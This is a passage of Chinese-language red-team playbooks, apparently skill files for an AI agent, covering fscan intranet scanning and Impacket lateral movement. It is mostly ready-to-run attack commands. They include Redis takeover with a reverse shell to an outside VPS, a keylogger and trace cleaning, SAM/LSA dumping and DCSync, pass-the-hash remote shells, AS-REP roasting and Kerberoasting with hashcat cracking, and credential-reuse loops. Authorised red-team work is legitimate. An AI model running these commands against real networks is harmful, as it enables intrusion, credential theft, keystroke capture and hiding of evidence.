-perf            输出性能统计 JSON
```

## 关键场景

### 1. 通过隧道打内网（最常用）

```bash
# 前提：已有 socks5（技能 suo5-tunnel，或 vps-reverse-shell 里 ssh -D）
# 实测验证过：fscan -socks5 会把流量真正送进隧道
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

注意：走代理时线程别开太大（隧道本身是瓶颈），`-t 50` 左右足够。

### 2. 在跳板机上开隧道给本机用

跳板机上执行（把内网 10 段暴露到 VPS 的 9100 端口，再 ssh 本地转发回来）：

```bash
./fscan -start-socks5 1080      # 跳板机:1080 变成 SOCKS5
# VPS 上反向隧道：ssh -R 9200:127.0.0.1:1080 ubuntu@$RT_VPS
# 本机：ssh -L 1080:127.0.0.1:9200 ubuntu@$RT_VPS
# 之后所有工具都能 -socks5 127.0.0.1:1080
```

### 3. 拿 Redis 直接要权限

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 写公钥 → ssh 上去
./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell
./fscan -h 10.0.0.5 -p 6379 -rsh $RT_VPS:9000              # 反弹到 VPS 监听
```

### 4. 落到服务器上之后

```bash
./fscan -local systeminfo        # 系统信息、环境变量、域控、网卡
./fscan -local keylogger         # 键盘记录（-keylog-output 指定输出）
./fscan -local cleaner           # 痕迹清理
```

## 结果落库（必须做）

fscan 的 txt 输出是分段的，解析后逐条入库：

```bash
# 每台存活主机
redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
# 每个开放端口/服务
redteam_asset_add  { engagement, ip, port, service, banner }   # 或 asset_link 关联
# 爆破/未授权成功的凭据与访问
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<段>.txt" }
redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
# 确认的漏洞（必须配 http_evidence 或等价证据）
redteam_vuln_add   { engagement, target, name: "Redis 未授权访问", severity: "high", evidence_ref }
```

**纪律**：`-o` 的输出文件是证据，拷回 `runs/`；不要只在终端里看一眼就算数。

## 排障

| 现象 | 处理 |
| --- | --- |
| 扫不动/极慢 | 去掉 `-np`、降 `-t`、加 `-time`；大网段先 `-m icmp` 圈活人 |
| 全是假开放 | 中间有防火墙/负载均衡回 SYN-ACK，用 `-time` 调大 + `-retry` 复核 |
| ICMP 失败 | 需要 root/`CAP_NET_RAW`；用 `sudo ./fscan -m icmp`，或改用 `-np` 只扫端口 |
| 爆破被锁 | 先用 `-usera` 少量试，确认无锁定策略（域账号尤其危险） |
| 中文乱码 | `-lang en` 或 `export LANG=zh_CN.UTF-8` |
| 想更安静 | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`，必要时 `-silent` |

## 相关技能

- `gogo-intranet`：先用它铺面
- `suo5-tunnel`：WebShell → SOCKS5，给 fscan 提供 `-socks5` 入口
- `vps-reverse-shell`：`-rsh` 的落地端、载荷投递
- `webshell-toolkit`：拿到 WebShell 后的管理

---

## lateral-movement

> 内网横向与提权：Impacket 套件（PtH/PsExec/WMI/DCOM/Kerberos/凭据转储）+ enum4linux/smbclient 信息枚举


# 内网横向与提权（Impacket 套件）

拿到一台机器和内网可达性之后，**横向到更多主机**（`server-host`）和**找到域控/核心系统**（`central-system`）
是内网阶段的主线。本机已装 **61 个 `impacket-*` 命令**（Kali 自带），是本阶段的主力工具集。

## 本机工具

| 工具 | 路径 | 用途 |
| --- | --- | --- |
| Impacket 套件 | `impacket-*`（PATH，或 `$RT_TOOLKIT/impacket/`） | 协议级横向、凭据转储、Kerberos 攻击 |
| enum4linux | `enum4linux`（PATH，或 `$RT_TOOLKIT/enum4linux/`） | SMB/域信息枚举（用户、共享、策略） |
| smbclient | `smbclient` | 共享浏览与读写 |
| nbtscan | `nbtscan` | NetBIOS 名称扫描 |
| proxychains4 | `proxychains4` | 走隧道访问内网（**只用 `-f` 临时配置**） |

## 零、先做的事（信息决定打法）

```bash
# 1) 看我有什么（凭据/哈希/域信息）
#    redteam_credential_list / redteam_access_list / redteam_asset_query
# 2) 枚举域环境（有域账号后）
impacket-GetADUsers $DOMAIN/$USER:$PASS -dc-ip $DC_IP -all
impacket-GetADComputers $DOMAIN/$USER:$PASS -dc-ip $DC_IP
enum4linux -a $TARGET               # 无凭据也能枚举出用户/共享/策略

# 3) 共享与文件
smbclient -L //$TARGET -N                                  # 空会话列共享
smbclient //$TARGET/<share> -U $USER%$PASS                # 读共享
impacket-smbclient $DOMAIN/$USER:$PASS@$TARGET           # 交互式，可 cd/ls/get/put
```

**内网扫描仍用 gogo/fscan**（技能 `gogo-intranet` / `fscan-intranet`）——本技能负责"进去之后怎么走"。

## 一、凭据转储（拿到一台机器后的第一优先）

```bash
# 1) 远程 dump SAM/LSA/SECRETS（需管理员凭据）
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET
impacket-secretsdump -hashes :$NTHASH $DOMAIN/$USER@$TARGET    # 用哈希直接 dump

# 2) 只 dump 本地 SAM
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 3) DCSync（有域管/复制权限时，直接拿域内所有哈希）—— 直通域控的关键一步
impacket-secretsdump $DOMAIN/<admin>:$PASS@$DC_IP -just-dc

# 4) 抓明文/票据：配合目标侧工具（如 mimikatz）或 lsassy
#    哈希拿到后用 credential-attack 离线破解，或直接 PtH（见下）
```

**输出处理**：dump 出的 `NTLM` 哈希逐条 `redteam_credential_add`（`source=凭据转储`，
明文的口令写 `secret_value`，哈希写 `note` 或 `secret_value` 并标注类型），文件存 `runs/`。

## 二、Pass-the-Hash（PtH，不用破解直接横向）

```bash
# 命令执行
impacket-psexec  -hashes :$NTHASH $DOMAIN/$USER@$TARGET          # 交互式 SYSTEM shell（噪声大）
impacket-wmiexec -hashes :$NTHASH $DOMAIN/$USER@$TARGET          # 半交互，噪声较小（推荐）
impacket-atexec  -hashes :$NTHASH $DOMAIN/$USER@$TARGET "whoami" # 单命令，最安静
impacket-smbexec -hashes :$NTHASH $DOMAIN/$USER@$TARGET          # 通过服务执行

# 拿文件
impacket-smbclient -hashes :$NTHASH $DOMAIN/$USER@$TARGET

# 数据库
impacket-mssqlclient -hashes :$NTHASH $DOMAIN/$USER@$TARGET
```

**psexec 会落地服务、噪声大、可能被杀软拦**；优先 `wmiexec`/`atexec`。

## 三、Kerberos 攻击（有域环境时）

```bash
# 1) 用户名枚举 + AS-REP 抓取（不需要密码，找不需要预认证的账号）
impacket-GetNPUsers $DOMAIN/ -usersfile runs/users.txt -dc-ip $DC_IP -format hashcat -outputfile runs/asrep.txt
hashcat -m 18200 runs/asrep.txt $RT_TOOLKIT/wordlists/rockyou.txt      # 离线破解

# 2) Kerberoasting（找有 SPN 的服务账号，抓 TGS 离线破解）
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile runs/kerberoast.txt
hashcat -m 13100 runs/kerberoast.txt $RT_TOOLKIT/wordlists/rockyou.txt

# 3) 票据申请与使用
impacket-getTGT $DOMAIN/$USER:$PASS -dc-ip $DC_IP            # 申请 TGT → .ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-wmiexec -k -no-pass $DOMAIN/$USER@$TARGET            # 用票据横向

# 4) 委派攻击（域内提权路径）
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC_IP
impacket-getST -spn <spn> -impersonate administrator $DOMAIN/$USER:$PASS
```

## 四、凭据复用（比攻击快得多，永远先试）

拿到任何账号/哈希后**先横向试**，而不是急着打新漏洞：
1. 同一口令试其它主机（`wmiexec` 批量）+ 其它协议（SMB/WinRM/RDP/SSH/MSSQL/MySQL）；
2. 本地管理员口令复用（同镜像批量装机的机器常同口令）——**这是内网横向命中率最高的一招**；
3. 域账号 → 试域内所有机器、共享、OA/邮件/堡垒机/运维平台后台；
4. 哈希 → PtH 到所有可达主机（写个循环，配合 `runs/hosts.txt`）。

## 五、隧道配合（内网目标不可直连时）

```bash
# 所有命令加 proxychains4，用临时配置（不要改系统配置）
cat > runs/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :$HASH $DOMAIN/$USER@10.0.0.5
proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
# ⚠️ 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射
```

## 六、纪律与边界

1. **收敛优先**：内网阶段的目标是**核心系统**（域控 / 堡垒机 / 运维平台 / 数据库集群 / 代码仓库 / 备份系统），
   不是把每台机器都打一遍。横向只是手段，得分点是 `server-host` 与 `central-system`。
2. **噪声控制**：`psexec` 落地服务、`secretsdump` 触碰 LSASS，都会被 EDR 盯上；
   优先 `wmiexec`/`atexec`，控制频率，别对整段做暴力横向。
3. **不要把自己打锁**：域账号连续失败会锁定策略；先用现成凭据复用，弱口令爆破按技能 `credential-attack` 的限流纪律。
4. **破坏性操作禁止**：不要停服务、不要改系统配置、不要删日志（除非演练明确要求且用户同意）。
5. **每台新主机都要登记**：`redteam_asset_add`（内网资产，`scope` 自动 internal），
   访问成功 `redteam_access_add`，凭据 `redteam_credential_add`。

## 七、输出与落库（强制）

1. **每台成功横向的主机记分**：`redteam_score_hit`（`server-host`），`evidence` 写
   「源主机 → 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 → 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\system`）。
2. **核心系统记分**：打到域控/堡垒机/运维平台/数据库集群 → `central-system`；
   拿到大量数据 → `bigdata-system`（**必须写实际条数，≥100 万条才算**）。
3. **凭据落库**：`redteam_credential_add`，`source` 写清（`凭据转储`/`Kerberoasting`/`AS-REP`/`凭据复用`/`离线破解`），
   `tool` 写实际命令原文，明文口令写 `secret_value`，文件路径写 `secret_ref`。
4. **访问会话落库**：`redteam_access_add`（`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`）。
5. 每个关键动作 `redteam_chain_add`：`stage_code=internal`（内网拿权限）或 `target`（拿靶标），
   **`tool` 写实际命令原文**（含 `-hashes`、`-k -no-pass` 等关键参数，以及 `proxychains4 -f ...` 前缀），
   `result` 写回显摘要——报告要能照着复现。
6. **回填知识库**：验证有效的通用利用脚本 `redteam_poc_add`（带 `category` + `engagement` + `asset_target` + `verified_note`，脱敏）。
